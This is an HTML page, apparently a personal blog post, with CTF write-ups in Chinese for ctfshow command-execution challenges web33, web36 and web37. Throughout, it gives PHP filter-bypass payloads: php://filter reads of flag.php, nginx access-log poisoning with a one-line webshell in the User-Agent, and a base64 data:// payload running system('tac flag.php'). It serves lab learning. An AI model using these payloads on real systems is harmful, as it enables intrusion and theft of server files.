@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ctfshow 命令执行web33 | l-y-fのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="题目来源：ctfshow 命令执行web33题目链接(https:&#x2F;&#x2F;d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show&#x2F;)题目描述：解题思路：启动靶机正则过滤了flag  system  php  cat  sort  shell  点号  空格  单引号  反引号  echo  分号  左括号  双引号和上一题一样文件包含加日志注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 命令执行web33">
+<meta property="og:url" content="https://l-y-f-f1111.github.io/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/index.html">
+<meta property="og:site_name" content="l-y-fのblog">
+<meta property="og:description" content="题目来源：ctfshow 命令执行web33题目链接(https:&#x2F;&#x2F;d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show&#x2F;)题目描述：解题思路：启动靶机正则过滤了flag  system  php  cat  sort  shell  点号  空格  单引号  反引号  echo  分号  左括号  双引号和上一题一样文件包含加日志注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803120502.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803114957.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803115023.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803124048.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803120246.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803120103.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803122036.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803122212.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803122240.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803123456.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803123101.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803123216.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803125814.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803132332.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803132656.png">
+<meta property="article:published_time" content="2026-08-04T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-12T08:46:58.175Z">
+<meta property="article:author" content="l-y-f">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260803120502.png">
+  
+    <link rel="alternate" href="/atom.xml" title="l-y-fのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">l-y-fのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://l-y-f-f1111.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2026-08-04-ctfshow 命令执行web33" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" class="article-date">
+  <time class="dt-published" datetime="2026-08-04T00:00:00.000Z" itemprop="datePublished">2026-08-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctfshow 命令执行web33
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web33<br>题目链接(<a target="_blank" rel="noopener" href="https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/">https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803120502.png"><br>正则过滤了flag  system  php  cat  sort  shell  点号  空格  单引号  反引号  echo  分号  左括号  双引号<br>和上一题一样文件包含加日志注入</p>
+<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><code>/?c=include%09$_GET[0]?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;]</code> &#x3D; <code>&#39;include%09$_GET[0]?&gt;&#39;</code><br>    <code>$_GET[0]</code> &#x3D; <code>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 flag.php   <code>include &#39;flag.php&#39;;</code><br>4.执行<code>include &#39;flag.php&#39;;</code><br><img src="/images/Pastedimage20260803114957.png"><br>base64解码<br><img src="/images/Pastedimage20260803115023.png"></p>
+<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803124048.png"><br>先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[0]?&gt;&#39;;</code><br>    <code>$_GET[0] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包 将一句话木马写入UA<br><img src="/images/Pastedimage20260803120246.png"><br>蚁剑连接 得到flag<br><img src="/images/Pastedimage20260803120103.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web36<br>题目链接(<a target="_blank" rel="noopener" href="https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/">https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机</p>
+<p><img src="/images/Pastedimage20260803122036.png"><br>在上一题的基础上 这里正则额外过滤了数字1-9</p>
+<h3 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h3><p>所以要在之前payload的基础上 将1修改为a<br>即<code>/?c=include%09$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code><br><img src="/images/Pastedimage20260803122212.png"><br>解码<br><img src="/images/Pastedimage20260803122240.png"></p>
+<h3 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803123456.png"><br>还是先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br>payload:<code>/?c=include%09$_GET[a]?&gt;&amp;a=/var/log/nginx/access.log</code><br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[a]?&gt;&#39;;</code><br>    <code>$_GET[a] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[a]?&gt;&#39;);</code><br>3.<code>$_GET[a]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包并将UA修改为一句话木马<br><img src="/images/Pastedimage20260803123101.png"><br>蚁剑连接<br><img src="/images/Pastedimage20260803123216.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web37<br>题目链接(<a target="_blank" rel="noopener" href="https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/">https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803125814.png"><br>正则过滤了flag不区分大小写<br>首先尝试<br><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>没有响应<br>原因是：代码里没有任何eval，传进去的<code>include%0aGET[1]?&gt;</code>会被当作文件名来处理，而不是作为代码执行<br><strong>区别</strong><br><code>eval(c)</code>意思是把c参数的内容当作PHP代码来执行<br><code>include(c)</code>意思是把c参数的内容当作文件名来处理</p>
+<p>使用PHP伪协议<br>已知：<code>&lt;?php</code>表示开始PHP解析 <code>?&gt;</code>表示结束PHP解析 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>在include包含时，被包含内容的PHP代码会被执行<br>所以读取flag文件的payload为：<code>data://text/plain,&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>第一部分是协议头：data:&#x2F;&#x2F;  这是PHP的data伪协议标识，可以在字符串中嵌入数据，让文件函数读取这段字符串，告诉include要用data协议来处理后面的内容<br>第二部分是媒体类型：text&#x2F;plain  表示后面的数据是纯文本格式，告诉PHP如何解析这个数据流<br>第三部分是逗号  这是分隔符，用来分隔协议参数和实际数据内容<br>第四部分 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt; </code>这是实际的数据内容，也就是要执行的PHP代码<br>但是由于flag被过滤 所以加一层base64编码<br><img src="/images/Pastedimage20260803132332.png"><br><code>/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>区别在于明文版本用逗号直接分隔，后面的内容原样传递<br>base64版本多了 <code>;base64</code>这个参数，告诉PHP后面的数据需要先base64解码再使用<br><img src="/images/Pastedimage20260803132656.png"><br>得到flag</p>
+<p>整个执行过程是绕过flag字符的过滤之后 PHP执行 include($c)，也就是 <code>include(&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=&quot;)</code><br>include函数看到这个路径是以data:&#x2F;&#x2F;开头，就调用PHP的data协议处理器来处理这个路径<br>识别出协议类型是data   媒体类型是text&#x2F;plain  编码方式是base64<br>提取出要解码的数据是 <code>PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>data协议处理器把解码后的内容返回给include函数<br>include函数拿到这个内容后，发现是PHP代码，就开始执行它<br>system函数向操作系统shell发送命令 <code>&quot;tac flag.php&quot;</code><br>tac命令把读取到的flag.php内容返回给system函数<br>system函数把命令的输出直接打印到HTTP响应中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" data-id="cmspupgt400061cuybzb3c1l4" data-title="ctfshow 命令执行web33" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/08/05/2026-08-05-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb38/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          ctfshow 命令执行web38
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/07/26/2026-07-26-Untitled/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Untitled</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/08/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/">ctfshow 命令执行web44</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 l-y-f<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
